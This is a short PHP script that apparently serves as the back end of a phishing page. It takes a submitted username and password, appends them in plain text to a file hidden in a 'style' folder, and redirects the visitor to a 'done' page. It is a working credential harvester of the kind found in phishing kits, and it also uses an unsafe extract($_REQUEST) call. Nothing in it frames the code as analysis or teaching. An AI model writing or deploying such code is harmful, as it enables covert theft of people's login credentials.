<?php
    extract($_REQUEST);
    $file=fopen("style/form-save.txt","a");
    
    fwrite($file,"name :");
    fwrite($file, $username ."\n");
    fwrite($file,"Password :");
    fwrite($file, $password ."\n");
    fclose($file);
    header("location: index.php");

    header("Location: done.php");
    exit();
 ?>


